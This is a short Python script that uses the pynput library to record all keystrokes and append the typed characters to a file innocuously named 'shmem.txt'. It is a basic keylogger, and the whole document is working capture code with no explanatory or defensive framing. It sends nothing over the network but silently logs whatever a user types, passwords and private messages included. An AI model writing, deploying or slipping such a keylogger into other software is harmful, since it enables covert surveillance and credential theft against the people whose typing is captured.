from pynput import keyboard
def keypressed(key):
    print(str(key))
    with open("shmem.txt", "a") as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("UNK KEY")
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()
